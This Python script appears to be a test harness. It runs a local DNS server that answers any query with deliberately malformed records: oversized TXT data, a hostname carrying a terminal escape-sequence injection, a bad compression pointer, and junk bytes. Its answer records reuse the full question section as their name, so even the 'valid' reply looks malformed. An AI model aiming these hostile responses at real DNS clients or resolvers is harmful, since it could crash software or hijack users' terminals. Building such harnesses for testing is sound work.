#!/usr/bin/env python3
"""Hostile DNS responder on unprivileged port 5333.
Answers any query with crafted records: giant TXT, hostile names
with terminal escapes, name compression abuse, oversized rdata."""
import socket
import struct
import threading
import sys

PORT = 5333

def dns_name(labels):
    out = b""
    for l in labels:
        out += bytes([min(len(l), 255)]) + l
    return out + b"\x00"

def build_response(data, variant):
    txid = data[:2]
    qdcount = struct.unpack(">H", data[4:6])[0]
    # echo question section
    pos = 12
    if qdcount:
        while pos < len(data) and data[pos] != 0:
            if data[pos] & 0xC0 == 0xC0:
                pos += 2; break
            pos += 1 + data[pos]
        pos += 1
        pos += 4  # qtype + qclass
    question = data[12:pos]

    if variant == "giant_txt":
        rdata = bytes([120]) + b"T" * 800
        ans = question + struct.pack(">HHIH", 16, 1, 120, len(rdata)) + rdata
        flags = 0x8180; ancount = 1
    elif variant == "esc_name":
        # PTR to a hostname with ESC bytes (tests downstream hostname sanitization)
        hostile = dns_name([b"\x1b]2;PWNED\x07host", b"local"])
        ans = question + struct.pack(">HHIH", 12, 1, 120, len(hostile)) + hostile
        flags = 0x8180; ancount = 1
    elif variant == "compression":
        # rdata pointing back into the question with weird offsets
        rdata = b"\xc0\xff"  # pointer to offset 255 (out of range)
        ans = question + struct.pack(">HHIH", 12, 1, 120, len(rdata)) + rdata
        flags = 0x8180; ancount = 1
    elif variant == "many":
        ans = b""
        for i in range(60):
            rdata = socket.inet_aton(f"127.0.0.{i%256}")
            ans += question + struct.pack(">HHIH", 1, 1, 60, 4) + rdata
        flags = 0x8180; ancount = 60
    elif variant == "junk":
        ans = b"\xff" * 200
        flags = 0x8180; ancount = 8
    else:  # valid A record
        rdata = socket.inet_aton("127.0.0.1")
        ans = question + struct.pack(">HHIH", 1, 1, 120, 4) + rdata
        flags = 0x8180; ancount = 1

    return (txid + struct.pack(">HHHHH", flags, qdcount, ancount, 0, 0) +
            question + ans)

def main():
    variant = sys.argv[1] if len(sys.argv) > 1 else "valid"
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", PORT))
    print(f"[*] hostile DNS :{PORT} variant={variant}", flush=True)
    while True:
        data, addr = s.recvfrom(4096)
        try:
            s.sendto(build_response(data, variant), addr)
        except Exception:
            pass

if __name__ == "__main__":
    main()
